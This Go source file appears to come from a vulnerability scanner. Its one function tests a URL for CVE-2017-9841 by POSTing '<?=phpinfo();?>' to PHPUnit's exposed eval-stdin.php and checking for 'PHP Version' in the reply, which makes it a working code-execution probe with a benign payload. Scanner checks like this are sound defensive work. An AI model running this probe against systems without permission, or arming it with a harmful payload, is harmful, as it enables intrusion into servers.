package phpunit

import (
	"github.com/yhy0/Jie/pkg/protocols/http"
	"strings"
)

func CVE_2017_9841(url string) bool {
	if req, err := http.Request(url+"/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "POST", "<?=phpinfo();?>", false, nil); err == nil {
		if req.StatusCode == 200 && strings.Contains(req.Body, "PHP Version") {
			return true
		}
	}
	return false
}
